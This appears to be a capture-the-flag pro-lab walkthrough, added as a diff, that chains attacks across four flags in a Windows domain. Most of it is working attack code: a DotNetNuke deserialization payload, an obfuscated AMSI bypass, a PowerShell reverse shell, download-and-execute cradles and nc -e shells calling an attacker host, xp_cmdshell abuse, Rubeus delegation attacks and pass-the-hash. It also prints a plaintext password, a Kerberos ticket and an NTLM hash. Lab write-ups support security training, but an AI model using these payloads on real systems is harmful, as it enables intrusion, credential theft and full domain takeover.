@@ -1,0 +1,152 @@
+==============================
+== FLAG 1 - The fun begins! ==
+==============================
+Enumerate 10.10.110.0/24 subnet, you will find a DNN server at 10.10.110.10, there is a black hat talk with demos on dotnet deserilization.
+We can find a reverse shell in aspx and upload it to the right directory. You can find that directory by using the read payload looking for web.config.
+payloads: https://gist.github.com/pwntester/72f76441901c91b25ee7922df5a8a9e4
+reverse shell: https://github.com/borjmz/aspx-reverse-shell/blob/master/shell.aspx
+you can also do a bind shell and upload nc.exe.
+Video blackhat talk for demo 3.
+==== This will upload a reverse shell.aspx and run it.
+curl -XGET -s http://10.10.110.10/nonexistent.aspx -b '.ASPXANONYMOUS=8PiZ68vG6wnYbiTnKvnLQH-OSJNEAwTDUe-JfMkStVc2ooH5FztKmAFe_VzdSjoj1rQQJbTYoNh5YsJiFUcaYEqthxOwukK3Zhihc1OT9pqTg4jA0; dnn_IsMobile=False;  DNNPersonalization=<profile><item key="name1:key1" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://10.10.14.X/shell.aspx</anyType><anyType xsi:type="xsd:string">C:\dotnetnuke\shell.aspx</anyType></MethodParameters><ObjectInstance xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>; language=en-US; __RequestVerificationToken=nZoxsNnVh9524fV8hUcS7Y14Nsl89OvP_JcNwY74h-elV7lHleD9aWNlgdjAb2vA7VMvdA2; USERNAME_CHANGED=' > /dev/null
+sleep 3 && curl http://10.10.110.10/shell.aspx &                                                                                                                            
+nc -lvnp 443  
+=====
+whoami: nt authority\network service
+type C:\DotNetNuke\flag.txt
+Cyb3rN3t1C5{De$3R!al!z@ti0n}
+
+
+
+
+=====================================================
+== FLAG 2 - We first learn to crawl before walking ==
+=====================================================
+we can enumerate the linked databases with PowerUpSQL.
+To Enumerate:
+iex(new-object net.webclient).downloadstring('http://10.10.14.X/PowerUpSQL.ps1')
+Get-SQLServerinfo -Verbose
+Enumerate linked servers
+Get-SQLServerLinkCrawl -Instance CYWEBDW\SQLEXPRESS
+we can see we are the sa user on M3SQLW server.
+We have to enable xp_cmd shell:
+Get-SQLQuery -Query 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT "m3sqlw.m3c.local"'
+Then test it out:
+Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell ''''whoami'''''') AT "m3sqlw.m3c.local"'
+Start a listener and get a nishang reverse shell
+Get-SQLQuery -Query 'EXECUTE(''xp_cmdshell "cmd /c powershell iex (new-object net.webclient).downloadstring(''''http://10.10.14.X/rev.ps1'''')"'') AT "m3sqlw.m3c.local"'
+========
+rev.ps1
+sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+$client = New-Object System.Net.Sockets.TCPClient('10.10.14.X',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+==========
+hostname: m3sqlw (Microsoft Windows Server 2016 Standard)
+user: m3c\svc_sql
+type C:\Users\svc_sql\Desktop\flag.txt
+
+Cyb3rN3t1C5{Sql$erv3rL!nkCr@wl}
+
+
+
+==================================
+== FLAG 3 - Those damn webapps! ==
+==================================
+Looking at BloodHound with svc_sql user we can see they are AllowedToDelegate to M3WEBAW.
+The user SVC_SQL@M3C.LOCAL has the constrained delegation privilege to the computer M3WEBAW.M3C.LOCAL.
+upload Rubeus and nc.exe to target
+iex(new-object net.webclient).downloadfile('http://10.10.14.X/Rubeus.exe','C:\Users\svc_sql\APpData\Local\Temp\Rubeus.exe')                                                                                                   
+iex(new-object net.webclient).downloadfile('http://10.10.14.X/nc.exe','C:\Users\svc_sql\APpData\Local\Temp\nc.exe')
+
+grab tgt of svc_sql.
+Rubeus.exe tgtdeleg /nowrap
+copy the base64 ticket and save.
+
+we can impersonate any user that isn't a protected user (admincount=1) the server admins group is not in this category.  Pick a user.
+cmd /c C:\Users\svc_sql\AppData\Local\Temp\Rubeus.exe s4u /user:svc_sql /impersonateuser:SILVIA.HARRISON /ticket:<base64blob> /msdsspn:"time/m3webaw.m3c.local" /altservice:cifs,host,http,winrm,RPCSS,wsman /ptt
+
+we can automate this a little with powershell:
+$out = (cmd /c C:\Users\svc_sql\AppData\Local\Temp\Rubeus.exe tgtdeleg /nowrap) | Out-String
+$ticket = (print $out | select -last 2 | select -first 1).trim() 
+$ticket | Out-File -FilePath C:\Users\svc_sql\AppData\Local\Temp\svc.txt
+cmd /c C:\Users\svc_sql\AppData\Local\Temp\Rubeus.exe s4u /user:svc_sql /impersonateuser:SILVIA.HARRISON /ticket:$ticket /msdsspn:"time/m3webaw.m3c.local" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt
+
+even though you can't dir C$ of m3webaw you can pssession right in.
+$sess = New-PSSession -ComputerName M3WEBAW.M3C.LOCAL
+Copy-Item -Path C:\Users\svc_sql\AppData\Local\Temp\nc.exe -Destination 'C:\Users\Silvia.Harrison\nc.exe' -ToSession $sess
+Invoke-Command -ScriptBlock {cmd /c C:\Users\Silvia.Harrison\nc.exe -e powershell 10.10.14.X 8443 } -Session $ses
+type C:\ActiveMQ\conf\jetty-realm.properties
+admin: 3f18DV^t!svBV4ntcrLRTWi2XaMCDK, admin
+
+Cyb3rN3t1C5{CR3d$_!n_fil3s}
+
+
+======================================
+== FLAG 4 - You can't constrain me! ==
+======================================
+We can see that svc_apache has genericWrite to M3DC.M3C.LOCAL
+to get a shell as this user we need to priv using activemq webapp.
+download a jsp reverse shell
+iex (new-object net.webclient).downloadfile('http://10.10.14.X/jspshell.jsp','C:\ActiveMQ\webapps\admin\jspshell.jsp')                                                                                          
+$user = "admin"                                                                                                                                                                                                 
+$pass = "3f18DV^t!svBV4ntcrLRTWi2XaMCDK"                                                                                                                                                                        
+$pair = "${user}:${pass}"                                                                                                                                                                                       
+$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)                                                                                                                                                          
+$base64 = [System.Convert]::ToBase64String($bytes)                                                                                                                                                              
+$basicAuthValue = "Basic $base64"                                                                                                                                                                               
+$headers = @{ Authorization = $basicAuthValue }                                                                                                                                                                 
+Invoke-WebRequest -uri "http://127.0.0.1:8161/admin/jspshell.jsp" -Headers $headers 
+
+The user SVC_APACHE@M3C.LOCAL has generic write access to the computer M3DC.M3C.LOCAL. 
+Generic Write access grants you the ability to write to any non-protected attribute on the target object, including "members" for a group, and "serviceprincipalnames" for a user
+Generic write to a computer object can be used to perform a resource based constrained delegation attack. 
+
+Load Powershell: 
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+I opted to get a better rev shell.
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe iex(new-object net.webclient).downloadstring('http://10.10.14.X/rev.ps1')
+We need to upload PowerView_Dev.ps1 and assign certian rights to svc_sql because they have s4u
+http://www.harmj0y.net/blog/redteaming/another-word-on-delegation/
+Resource-Based
+constraineduser == svc_sql
+attacker = svc_apache
+target == m3dc.m3c.local
+
+https://gist.github.com/HarmJ0y/a1ae1cf09e5ac89ee15fb3da25dcb10a
+iex(new-object net.webclient).downloadstring('http://10.10.14.X/PowerView_dev.ps1')
+$TargetComputer = "m3dc.m3c.local"
+#find s4u2self enabled targets
+Get-DomainObject -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=16777216)' -Properties samaccountname,useraccountcontrol
+
+$AttackerSID = Get-DomainUser svc_apache -Properties objectsid | Select -Expand objectsid
+$ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
+$ACE
+CovertFrom-SID $ACE.SecurityIdentifier
+$S4UIdentity = "M3C\svc_sql"
+$IdentitySID = ((New-Object -TypeName System.Security.Principal.NTAccount -ArgumentList $S4UIdentity).Translate([System.Security.Principal.SecurityIdentifier])).Value
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($IdentitySID))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+
+#verify ACE was added correctly
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl
+ConvertFrom-SID $Descriptor.DiscretionaryAcl.SecurityIdentifier
+
+from svc_sql account lets run rubeus.
+cmd /c C:\Users\svc_sql\AppData\Local\Temp\Rubeus.exe tgtdeleg /nowrap
+doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA619XJ/LnRyj5sMOm5eReziaGBwlDKfwy1JEAtLBeH2Sez50KeIxuu6Um2w8+wfXfyEyXlVLHFJWhENuUOYlIIQFPMSi8ccFJFE6hnI/OWbNHzLLwDQswse6rJBst3yqWVUwikeg8VrAq74cSBS1FRe4/hkT6YFzQiXiwaFt8SFi1FEamqLhWAw5KTC4W4Rxp0Qb2pnjCAt/byn9dFAUUQ7LWOx1Qn5R0oFP/Vd0UCQ8oDvfXWtO6FvKlJv1sJTXNg8fgUO0nlWCya7K748wVKYVPCJ7VjLK6th3bTu0JdFCC2mATTuuqeksTiqhMeZeK2OwIQXFcZy54qSa/XxJ99+JGiT8Jk1XvvqXHleeUkLB7eVFTKypNr8h1rhlg5UGihc10yCatWs9NeXWd1UzyWHerQP+da1t7rXd5sAjTHFLluMTJcJ68Ug+HHkh2krm1FKObKWbLvizLEjlz0CNF3rXf6caLXV+vERksboZihjORmJZqMpdnbMr4qcnTHKD/XvIT/oBf1Ln+5bqDkeTWaMT0EKugIy4NXrJzbTnDZ4bFmfLfRXAqNzyl/V/KlT/3LvqvMBIpmu1MvX2tce74XjbBmhad+3GapS5mWsgL2TCC9WfX1QCbuHSpf3ZjGPMg/D5euZxLzpyKbDUpjcfCjpj2gxXOEJWegmmaCBIN8xvvsu+x4NRvcYz+74ZAqj7vrL17jWZjfs/yu3YtbxvZtUW5vtfXHC0b0ZxJ4z6TH4NBvQnrr8Ff083LxYJ+u+Ziz1Z01DmNyNZvIhNBmphTgxx4mw6FzufM2qbXLUuIPfCx68JdXWwpTzzgu0g32oWxiSlXk58m74X/7zADqHMbEWQnqRg9A4slFMqszVSuKfGrAqj+PAe8dfwu26afZMV39xLtUfYQF9I37NuBcxWuBJfEgvKcGwK8H5NxAm1MeEAXqXdgd/SdPffx7PpD7qAE2q9AYuyiDVh8cDXKwJwdtrtGymmdmZ0uU8gWe0MrMi+wtAUD1rujx5I79J9Vdfcugfa89y/VWzAJH3hQ6CbcRCPTPN31ptcZZzuvF23yFHvJeaii4heJv/P6ntgkGc/xXTK1+/+vDPqJLUAmd9U9TpA4LbUjvXwsV6ybSnlxORjSV8JAXPS8xIv4v129enHvC5xua7zxiemd46UsgwQina5Siwo7Qd5Xo+YrvMWgcSu914BYtub2iJtnruMnW9jiGlsBzi6OFHUexe6pKe60g7FRDt3v9kiVKpAelTqVqOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIExm26HBIz+QuB+8wzEDxO34L65wnM/4OZzgkjAQAdIToQsbCU0zQy5MT0NBTKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA1MDUyMTQ1MjZaphEYDzIwMjAwNTA2MDczMDAxWqcRGA8yMDIwMDUxMjIxMzAwMVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw=
+
+cmd /c C:\Users\svc_sql\AppData\Local\Temp\Rubeus.exe s4u /user:svc_sql /impersonateuser:NORMA.BRANHAM /ticket:doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgECooIDsQSCA619XJ/LnRyj5sMOm5eReziaGBwlDKfwy1JEAtLBeH2Sez50KeIxuu6Um2w8+wfXfyEyXlVLHFJWhENuUOYlIIQFPMSi8ccFJFE6hnI/OWbNHzLLwDQswse6rJBst3yqWVUwikeg8VrAq74cSBS1FRe4/hkT6YFzQiXiwaFt8SFi1FEamqLhWAw5KTC4W4Rxp0Qb2pnjCAt/byn9dFAUUQ7LWOx1Qn5R0oFP/Vd0UCQ8oDvfXWtO6FvKlJv1sJTXNg8fgUO0nlWCya7K748wVKYVPCJ7VjLK6th3bTu0JdFCC2mATTuuqeksTiqhMeZeK2OwIQXFcZy54qSa/XxJ99+JGiT8Jk1XvvqXHleeUkLB7eVFTKypNr8h1rhlg5UGihc10yCatWs9NeXWd1UzyWHerQP+da1t7rXd5sAjTHFLluMTJcJ68Ug+HHkh2krm1FKObKWbLvizLEjlz0CNF3rXf6caLXV+vERksboZihjORmJZqMpdnbMr4qcnTHKD/XvIT/oBf1Ln+5bqDkeTWaMT0EKugIy4NXrJzbTnDZ4bFmfLfRXAqNzyl/V/KlT/3LvqvMBIpmu1MvX2tce74XjbBmhad+3GapS5mWsgL2TCC9WfX1QCbuHSpf3ZjGPMg/D5euZxLzpyKbDUpjcfCjpj2gxXOEJWegmmaCBIN8xvvsu+x4NRvcYz+74ZAqj7vrL17jWZjfs/yu3YtbxvZtUW5vtfXHC0b0ZxJ4z6TH4NBvQnrr8Ff083LxYJ+u+Ziz1Z01DmNyNZvIhNBmphTgxx4mw6FzufM2qbXLUuIPfCx68JdXWwpTzzgu0g32oWxiSlXk58m74X/7zADqHMbEWQnqRg9A4slFMqszVSuKfGrAqj+PAe8dfwu26afZMV39xLtUfYQF9I37NuBcxWuBJfEgvKcGwK8H5NxAm1MeEAXqXdgd/SdPffx7PpD7qAE2q9AYuyiDVh8cDXKwJwdtrtGymmdmZ0uU8gWe0MrMi+wtAUD1rujx5I79J9Vdfcugfa89y/VWzAJH3hQ6CbcRCPTPN31ptcZZzuvF23yFHvJeaii4heJv/P6ntgkGc/xXTK1+/+vDPqJLUAmd9U9TpA4LbUjvXwsV6ybSnlxORjSV8JAXPS8xIv4v129enHvC5xua7zxiemd46UsgwQina5Siwo7Qd5Xo+YrvMWgcSu914BYtub2iJtnruMnW9jiGlsBzi6OFHUexe6pKe60g7FRDt3v9kiVKpAelTqVqOB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIExm26HBIz+QuB+8wzEDxO34L65wnM/4OZzgkjAQAdIToQsbCU0zQy5MT0NBTKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA1MDUyMTQ1MjZaphEYDzIwMjAwNTA2MDczMDAxWqcRGA8yMDIwMDUxMjIxMzAwMVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw= /msdsspn:"cifs/m3dc.m3c.local" /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman /ptt
+
+klist to verify tickets were injected.
+
+dcsync with new tickets
+proxychains python psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8f752e50f2dbeefa4fd7fcf0fa7d7b98 Norma.Branham@10.9.20.10 cmd
+Cyb3rN3t1C5{C0n$tr@!n3d!}
+
+
+
+
+
